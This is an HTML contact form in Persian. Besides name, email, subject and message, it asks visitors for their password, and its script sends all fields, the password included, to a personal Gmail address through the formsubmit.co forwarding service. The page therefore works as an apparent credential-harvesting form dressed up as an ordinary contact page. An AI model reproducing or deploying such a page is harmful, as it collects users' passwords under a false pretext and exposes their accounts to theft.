<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فرم تماس</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Tahoma, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 500px;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: bold;
        }
        input, textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            font-family: Tahoma;
        }
        input:focus, textarea:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background: #764ba2;
        }
        .success {
            display: none;
            text-align: center;
            padding: 30px;
        }
        .success.show {
            display: block;
        }
        .success h2 {
            color: #10b981;
        }
        .success-icon {
            font-size: 80px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="formSection">
            <h2>فرم تماس با ما</h2>
            <form id="contactForm">
                <div class="form-group">
                    <label>نام:</label>
                    <input type="text" name="name" required>
                </div>
                <div class="form-group">
                    <label>ایمیل:</label>
                    <input type="email" name="email" required>
                </div>
                <div class="form-group">
                    <label>رمز عبور:</label>
                    <input type="password" name="password" required>
                </div>
                <div class="form-group">
                    <label>موضوع:</label>
                    <input type="text" name="subject" required>
                </div>
                <div class="form-group">
                    <label>پیام:</label>
                    <textarea name="message" rows="5" required></textarea>
                </div>
                <button type="submit">ارسال</button>
            </form>
        </div>
        
        <div id="successSection" class="success">
            <div class="success-icon">✅</div>
            <h2>ارسال موفقیت آمیز بود</h2>
            <p>از تماس شما متشکریم</p>
            <button onclick="location.reload()">ارسال پیام جدید</button>
        </div>
    </div>
    
    <script>
        document.getElementById('contactForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const formData = new FormData(this);
            const btn = this.querySelector('button');
            btn.disabled = true;
            btn.textContent = 'در حال ارسال...';
            
            try {
                const response = await fetch('https://formsubmit.co/asmnabye@gmail.com', {
                    method: 'POST',
                    body: formData,
                    headers: { 'Accept': 'application/json' }
                });
                
                if (response.ok) {
                    document.getElementById('formSection').style.display = 'none';
                    document.getElementById('successSection').classList.add('show');
                } else {
                    alert('خطا در ارسال');
                    btn.disabled = false;
                    btn.textContent = 'ارسال';
                }
            } catch (error) {
                alert('خطا در ارسال');
                btn.disabled = false;
                btn.textContent = 'ارسال';
            }
        });
    </script>
</body>
</html>
